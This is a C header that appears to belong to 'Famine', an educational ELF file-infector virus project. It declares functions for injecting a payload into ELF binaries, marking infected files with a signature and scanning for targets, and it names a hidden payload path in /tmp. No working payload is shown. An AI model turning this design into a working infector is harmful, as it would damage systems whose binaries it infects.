#ifndef _FAMINE_H
# define _FAMINE_H

# ifndef _GNU_SOURCE
#  define _GNU_SOURCE
# endif

# include <stddef.h>
# include <stdint.h>
# include <stdlib.h>
# include <elf.h>
# include <string.h>
# include <sys/stat.h>
# include <sys/mman.h>
# include <unistd.h>
# include <fcntl.h>

# define SIGNATURE "ialgac|beeligul"
# define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1)
# define FAMINE_HELPER_PATH "/tmp/.famine_payload"
# define PAYLOAD_BIN_SIZE 88
# define POP_RAX_OFFSET 5

typedef struct  s_file
{
    int     fd;
    char    *head;
    size_t  size;

}               t_file;


Elf64_Phdr  *last_phdr(char *data);
uint64_t    payload(char *data, size_t data_size, char *code, size_t code_size);
int         is_signed(t_file file);
int         sign(t_file target);
int         sign_blob(t_file target);

t_file      file_load(const char *path, size_t append_size);
int         file_unload(t_file file);
void        scan_targets(void);

#endif
